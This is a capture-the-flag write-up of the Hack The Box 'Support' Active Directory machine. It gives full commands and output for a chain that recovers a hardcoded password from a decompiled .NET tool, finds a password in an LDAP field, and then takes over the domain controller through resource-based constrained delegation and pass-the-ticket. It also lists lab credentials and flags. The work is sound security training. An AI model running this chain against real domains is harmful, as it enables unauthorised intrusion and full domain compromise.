# HTB Support — Writeup

## **Target:** 10.129.151.59 (DC.support.htb)

## **Domain:** support.htb

## **Difficulty:** Windows Active Directory box

## **Starting point:** No credentials provided — fully unauthenticated start (Guest/Null SMB access only)

## **Author:** Faridd

---

## 1. Reconnaissance

### 1.1 — Port Scanning

A fast port scan was run first with RustScan to identify open ports:

```bash
rustscan -a 10.129.151.59
```

Open ports:

```
53   - DNS
88   - Kerberos
135  - RPC
139  - NetBIOS
389  - LDAP
445  - SMB
464  - kpasswd (Kerberos password change)
593  - RPC over HTTP
636  - LDAPS
3268 - Global Catalog (LDAP)
3269 - Global Catalog (LDAPS)
5985 - WinRM
9389 - AD Web Services
```

This combination of ports (88, 389, 445, 464, 3268, 9389) is the standard fingerprint of a Windows **Active Directory Domain Controller**. Unlike a typical engagement, there is no starting credential pair here — this box begins from a fully unauthenticated position, so the first goal is to find *any* usable foothold rather than escalate from a known user.

### 1.2 — Anonymous SMB Enumeration

Since no credentials were provided, the first move was to test for **Null Session / Guest access** on SMB — a common misconfiguration on AD environments where Guest is left enabled with blank credentials:

```bash
netexec smb 10.129.151.59 -u "guest" -p "" --shares
```

Result:

```
SMB   10.129.151.59   445   DC   Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.129.151.59   445   DC   [+] support.htb\guest:
SMB   10.129.151.59   445   DC   Share           Permissions   Remark
SMB   10.129.151.59   445   DC   -----           -----------   ------
SMB   10.129.151.59   445   DC   ADMIN$                        Remote Admin
SMB   10.129.151.59   445   DC   C$                             Default share
SMB   10.129.151.59   445   DC   IPC$            READ          Remote IPC
SMB   10.129.151.59   445   DC   NETLOGON                      Logon server share
SMB   10.129.151.59   445   DC   support-tools   READ          support staff tools
SMB   10.129.151.59   445   DC   SYSVOL                        Logon server share
```

Two important findings here: the domain is confirmed as `support.htb`, and — critically — the **`support-tools`** share allows anonymous **READ** access. A non-default, custom-named share with public read access on a Domain Controller is immediately worth investigating, since it's not part of the standard Windows share set and was clearly placed there deliberately by whoever built the box/environment.

---

## 2. Foothold — Credential Extraction from a Leaked Binary

### 2.1 — Browsing the `support-tools` Share

The share was connected to anonymously (`-N` flag = no password prompt, null session) and listed:

```bash
smbclient //10.129.151.59/support-tools -N
```

```
7-ZipPortable_21.07.paf.exe         2,880,728 bytes
npp.8.4.1.portable.x64.zip          5,439,245 bytes
putty.exe                           1,273,576 bytes
SysinternalsSuite.zip               48,102,161 bytes
UserInfo.exe.zip                      277,499 bytes
windirstat1_1_2_setup.exe              79,171 bytes
WiresharkPortable64_3.6.5.paf.exe   44,398,000 bytes
```

Most of these are well-known, generic portable admin tools (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark) — the kind of toolkit any sysadmin might keep on a share. **`UserInfo.exe.zip`** stands out as the anomaly: it's not a recognizable public tool, it's much smaller than the others, and its name suggests it's a custom/internal utility. Custom binaries on an otherwise-generic admin tools share are a classic lead, since internal tools are far more likely to have hardcoded credentials or embedded service-account logic than anything off-the-shelf.

### 2.2 — Retrieving and Unpacking the Binary

```bash
get UserInfo.exe.zip
exit
unzip UserInfo.exe.zip
```

This extracted `UserInfo.exe` along with its .NET dependency DLLs (`CommandLineParser.dll`, `Microsoft.Extensions.*.dll`, `System.*.dll`) and its config file — confirming it's a custom-built .NET application, not an off-the-shelf tool.

The `UserInfo.exe.config` file was checked first, as config files are a common place to find plaintext connection strings — but it held nothing sensitive. That ruled out the easy path and meant the credential logic, if any, was inside the compiled binary itself.

### 2.3 — Decompiling the Binary with ILSpy

Since `UserInfo.exe` is a .NET executable, it can be decompiled back to near-original C# source (.NET compiles to an intermediate language that retains most semantic structure, unlike native binaries). **ILSpy** (specifically the cross-platform Avalonia build) was installed for this:

```bash
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-x64
sudo ./ILSpy
```

`UserInfo.exe` was opened in ILSpy (**File → Open → UserInfo.exe**) for manual static analysis.

### 2.4 — Locating and Reversing the Password Obfuscation

Browsing the decompiled namespaces, a function named `getPassword():string` stood out immediately — a function whose sole purpose is to return a password is always worth inspecting first in binary analysis, since it tells you exactly how (and whether) a credential is protected.

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    byte[] array2 = array;
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```

This isn't real encryption — it's a two-stage obfuscation: Base64-decode, then XOR each byte against a repeating key, then XOR again against the constant `0xDF`. Both the key and `0xDF` are fixed, so this is fully and trivially reversible once the inputs are known. The inputs (`enc_password` and `key`) were found in the `Protected` class:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

### 2.5 — Reimplementing the Decryption in Python

Rather than running the .NET binary itself, the same logic was reimplemented in Python to decrypt the string offline — faster to iterate on and doesn't depend on a .NET runtime:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)
result = bytearray(array)

for i in range(len(array)):
    result[i] = (array[i] ^ key[i % len(key)]) ^ 0xDF

print(result.decode())
```

```bash
python3 decrypt_userinfo.py
```

Result:

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

This is a decrypted plaintext password, but on its own it has no username attached yet — the next step was figuring out *what account* this password belongs to.

### 2.6 — Identifying the Associated Account via Further Decompilation

Continuing to browse the decompiled binary, the `UserInfo.Services` namespace contained an `LdapQuery()` constructor:

```csharp
public LdapQuery()
{
    string password = Protected.getPassword();
    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
    entry.set_AuthenticationType((AuthenticationTypes)1);
    ds = new DirectorySearcher(entry);
}
```

This answers the open question directly: the decrypted password belongs to a service account named **`ldap`**, and the binary uses it to bind to the domain's LDAP service and run searches. In other words, this internal "UserInfo" tool is a thin front-end that authenticates to AD as `ldap` to look up user information — exactly the kind of low-privilege, narrowly-scoped service account you'd expect to find hardcoded into an internal tool, and exactly the kind of account that's valuable to an attacker because it grants authenticated LDAP access to the whole directory.

---

## 3. LDAP Enumeration as `ldap` — Finding a Second Credential

### 3.1 — Setting Up Name Resolution

```bash
echo '10.129.151.59 support.htb' | sudo tee -a /etc/hosts
```

### 3.2 — Authenticated LDAP Bind

With a valid username (`ldap`) and password in hand, a full LDAP query against the domain was run to confirm the credentials work and pull the entire directory:

```bash
ldapsearch -H ldap://support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -D ldap@support.htb "*"
```

This succeeded and returned the full directory tree — confirming the decrypted credentials are valid and the account has at least read access to AD objects.

### 3.3 — Checking the `description` Field First

The `description` attribute on AD user objects is one of the most common places administrators accidentally leave plaintext passwords or hints, so it's always the first thing worth grepping for:

```bash
ldapsearch -H ldap://support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -D ldap@support.htb "*" | grep -i Description
```

This came back empty — no credentials hiding in `description` this time. Rather than stopping there, the search was broadened to look at the *shape* of the data itself rather than guessing at individual field names.

### 3.4 — Finding the Anomalous Field by Attribute Frequency Analysis

The idea here: dump every person object's full attribute set, then count how many times each attribute name appears across all objects. Attributes that exist on *every* user (like `cn`, `sAMAccountName`, `objectSid`) will have a high, uniform count. An attribute that appears on only **one** object is structurally unusual and worth checking by hand — it means someone manually added a non-standard field to a single account.

```bash
ldapsearch -H ldap://support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -D ldap@support.htb "(objectCategory=person)" "*" -LLL > people.ldif

grep -oP '^[a-zA-Z][a-zA-Z0-9;-]*(?=:)' people.ldif | sort | uniq -c | sort -n
```

Result (truncated to the relevant low-frequency entries):

```
      1 info
      1 msDS-SupportedEncryptionTypes
      1 servicePrincipalName
      2 adminCount
      3 description
     ...
     20 sAMAccountName
```

The `info` field appears exactly **once** across all 20 person objects — every other field is either universal (20 occurrences) or belongs to a handful of accounts with real descriptions/SPNs. A field with a count of 1 that isn't one of the standard sparse attributes (like `servicePrincipalName`, which is expected to be rare) is the clearest anomaly in this output.

### 3.5 — Extracting the Credential from the `info` Field

The specific object holding the `info` field was located by searching the `.ldif` output directly, which identified it as belonging to the **`support`** user:

```
support:Ironside47pleasure40Watchful
```

This is the `info` field being misused — again — as an informal password-storage location, a known real-world anti-pattern this box is clearly built to teach.

### 3.6 — Verifying the New Credential

```bash
netexec smb 10.129.151.59 -u "support" -p "Ironside47pleasure40Watchful" --shares
```

Result: `[+] support.htb\support:Ironside47pleasure40Watchful` — confirmed valid, and share listing now shows **NETLOGON** and **SYSVOL** as READ-accessible too (compared to the guest session earlier), indicating this is a genuine authenticated domain user, not another anonymous-level account.

---

## 4. Initial Shell and User Flag

### 4.1 — Authenticating via WinRM

Port 5985 (WinRM) was open from the initial scan, and the `support` account was tested directly for a shell:

```bash
evil-winrm -i 10.129.151.59 -u 'support' -p 'Ironside47pleasure40Watchful'
```

This succeeded, confirming `support` has WinRM login rights — not just a domain account, but one that's been explicitly granted remote-management access.

### 4.2 — Retrieving the User Flag

```powershell
cd ..\Desktop
type user.txt
```

Result: `fd5295f501e278dac20faeb33770f45e` (user flag).

### 4.3 — Checking Local Privileges

```powershell
whoami /priv
```

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing exploitable as a standalone local privilege — but `SeMachineAccountPrivilege` is worth flagging immediately: it means this account (or really, any domain user by default via `ms-DS-MachineAccountQuota`) is allowed to join new computer objects to the domain. This becomes directly relevant later during the RBCD attack, where a fake computer account needs to be created.

---

## 5. BloodHound Collection and the Privilege-Escalation Path

### 5.1 — Setting Up Name Resolution for the DC

```bash
echo "10.129.151.59 dc.support.htb" | sudo tee /etc/hosts
```

### 5.2 — Collecting AD Data as `support`

```bash
bloodhound-python -ns 10.129.151.59 -d support.htb -u support -p 'Ironside47pleasure40Watchful' -c All --zip
```

This enumerated the domain's users, groups, GPOs, OUs, containers, and computer objects and packaged the result into a zip for import into the BloodHound GUI.

### 5.3 — Identifying the Escalation Path

Inside BloodHound, the group memberships for `support` were checked first — the standard "where do I start" question on any AD box once you have a working low-privilege credential. `support` was found to be a member of the **SHARED SUPPORT ACCOUNTS** group, and that group holds a **`GenericAll`** permission directly on the **DC computer object**.

```
support --(member of)--> SHARED SUPPORT ACCOUNTS
SHARED SUPPORT ACCOUNTS --(GenericAll)--> DC (computer object)
```

`GenericAll` on a computer object is one of the most powerful ACL misconfigurations possible on an AD box, because it means full control over that object's attributes — including the ones that control how the object authenticates and what it can be trusted to do. This single edge is effectively the entire remaining roadmap: everything from here is about choosing *which* mechanism to abuse that `GenericAll` right through.

---

## 6. Abusing GenericAll on the DC — Attempt 1: Shadow Credentials (Failed)

### 6.1 — Why Shadow Credentials Was the First Choice

With `GenericAll` on a computer object, the most direct modern technique is **Shadow Credentials**: writing an attacker-controlled public key into the target object's `msDS-KeyCredentialLink` attribute, then using the matching private key to request a Kerberos TGT for that object via **PKINIT** (certificate-based authentication) — no password reset needed, and no AD CS enrollment required, since you're writing the key credential directly rather than requesting a certificate.

### 6.2 — The Attempt and Why It Failed

The attempt was made using the standard pywhisker/certipy-shadow tooling, targeting the `DC$` computer object. It failed with:

```
KDC_ERR_PADATA_TYPE_NOSUPP
```

This error means the KDC rejected the PKINIT pre-authentication type entirely — not that the key credential write failed, but that the domain's Key Distribution Center doesn't support certificate-based Kerberos authentication at all. In practice this means there's no AD Certificate Services (AD CS) infrastructure deployed in this domain to validate the certificate-mapped logon. **Lesson:** `GenericAll` on a computer object is necessary but not sufficient for Shadow Credentials — the domain also needs PKINIT/AD CS support as a precondition, and that can't be assumed just because the ACL allows the write.

This failure is a useful pivot point rather than a dead end: it rules out one entire *category* of GenericAll abuse (identity-forging via key credentials) and points toward the other major category — abusing GenericAll to configure **delegation** instead, which doesn't depend on AD CS at all.

---

## 7. Abusing GenericAll on the DC — Attempt 2: Resource-Based Constrained Delegation (RBCD)

### 7.1 — Why RBCD Was the Correct Alternative

`GenericAll` on a computer object also grants the right to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on that object — the attribute that controls **Resource-Based Constrained Delegation**. If an attacker controls a computer account (a password is known for it), and that computer account is listed in another object's `msDS-AllowedToActOnBehalfOfOtherIdentity`, then the attacker's computer account is trusted to request service tickets *impersonating any user* (including Administrator) against that target, via the Kerberos S4U extensions. This path depends only on standard Kerberos delegation, not on AD CS — so it sidesteps the exact limitation that broke Shadow Credentials.

The attack requires three stages: get a computer account you control onto the domain, point the target's delegation attribute at it, then use S4U to mint an impersonated ticket.

### 7.2 — Step 1: Creating an Attacker-Controlled Computer Account

Domain users can join new computers to the domain by default (`ms-DS-MachineAccountQuota`, consistent with the `SeMachineAccountPrivilege` seen earlier on `support`). This was attempted first over LDAPS:

```bash
impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host dc.support.htb -dc-ip 10.129.151.59 -domain-netbios SUPPORT 'support.htb/support:Ironside47pleasure40Watchful'
```

This failed:

```
[-] socket ssl wrapping error: [Errno 104] Connection reset by peer
```

The LDAPS channel was being reset — rather than troubleshoot the TLS/channel-binding configuration, the simpler fix was to switch transport method entirely. `impacket-addcomputer` supports creating the computer account over **SAMR** (an RPC-based protocol over SMB) instead of LDAPS, which avoids the TLS layer altogether:

```bash
impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host dc.support.htb -dc-ip 10.129.151.59 -domain-netbios SUPPORT 'support.htb/support:Ironside47pleasure40Watchful'
```

Result:

```
[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```

`ATTACKERSYSTEM$` now exists as a real computer object in the domain, with a password fully known to the attacker.

### 7.3 — Step 2: Writing the RBCD Configuration

This is the actual exploitation of the `GenericAll` right: using it to write to `DC$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, declaring that `ATTACKERSYSTEM$` is permitted to act on behalf of other identities when authenticating to `DC$`.

```bash
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'domain/support:Ironside47pleasure40Watchful' -dc-ip 10.129.151.59
```

Result:

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6101)
```

The tool itself confirms the attribute was previously empty (no prior delegation configured) and is now set, with `ATTACKERSYSTEM$`'s SID listed as the trusted delegate. This is the precise moment the `GenericAll` ACL is converted into a concrete, usable trust relationship.

### 7.4 — Step 3: Requesting an Impersonated Service Ticket (S4U2Self + S4U2Proxy)

With the delegation relationship in place, a service ticket for `DC$` can now be requested *as Administrator*, using only `ATTACKERSYSTEM$`'s own credentials. This uses the Kerberos S4U extensions in two chained steps, both handled automatically by `impacket-getST`:
- **S4U2Self** — `ATTACKERSYSTEM$` requests a ticket to itself, on behalf of Administrator (this is allowed for any account, it doesn't require special rights — it's what makes the next step possible)
- **S4U2Proxy** — that self-ticket is then exchanged for a real service ticket to the target SPN (`cifs/dc.support.htb`), and this exchange *is* permitted specifically because of the RBCD relationship configured in 7.3

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.151.59 'support.htb/ATTACKERSYSTEM$:Summer2018!'
```

Result:

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

A valid Kerberos service ticket for `cifs/dc.support.htb`, impersonating Administrator, is now saved locally as a `.ccache` file.

---

## 8. Pass-the-Ticket and Domain Compromise

### 8.1 — Loading the Ticket

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

### 8.2 — Authenticating with the Forged Ticket

With the ticket loaded into the Kerberos credential cache environment variable, `impacket-psexec` was pointed at the DC using Kerberos authentication (`-k`) and no password (`-no-pass`), since the ticket itself is the credential:

```bash
impacket-psexec support.htb/Administrator@DC.SUPPORT.HTB -k -no-pass -dc-ip 10.129.151.59
```

This returned a shell as **NT AUTHORITY\SYSTEM** on the Domain Controller — full domain compromise, achieved entirely through Kerberos delegation abuse without ever needing Administrator's actual password or hash.

### 8.3 — Root Flag

```powershell
cd C:\Users\Administrator\Desktop\
dir
type root.txt
```

```
root.txt   34 bytes
```

Result: `014a7e705f1fa91a0be6e046c4027d41` (root flag).

---

## 9. Summary of the Chain

```
Anonymous SMB (Guest/Null Auth)
   --> support-tools share (READ)
   --> UserInfo.exe.zip leaked
   --> Decompiled (ILSpy) --> reversed XOR+Base64 obfuscation
   --> ldap service account password recovered
   --> Authenticated LDAP bind as ldap
   --> Attribute-frequency anomaly --> "info" field on support user
   --> support:Ironside47pleasure40Watchful recovered
   --> WinRM shell as support (user.txt)
   --> BloodHound: support -> SHARED SUPPORT ACCOUNTS -> GenericAll -> DC$
   --> [FAILED] Shadow Credentials (no PKINIT/AD CS support on KDC)
   --> [SUCCESS] RBCD: add ATTACKERSYSTEM$ -> write msDS-AllowedToActOnBehalfOfOtherIdentity on DC$
   --> S4U2Self + S4U2Proxy impersonating Administrator -> service ticket for cifs/dc.support.htb
   --> Pass-the-Ticket (impacket-psexec) -> NT AUTHORITY\SYSTEM on DC (root.txt)
```

**Core takeaway:** `GenericAll` on a computer object doesn't have one fixed exploitation path — it grants control over *multiple* independent attack surfaces on that object (key credentials for cert-based auth, and delegation settings for Kerberos-based impersonation). When one abuse path is blocked by a missing domain precondition (here, no AD CS/PKINIT support), the same underlying ACL can often still be exploited through a different mechanism — RBCD matched what this specific KDC actually supported, where Shadow Credentials did not.
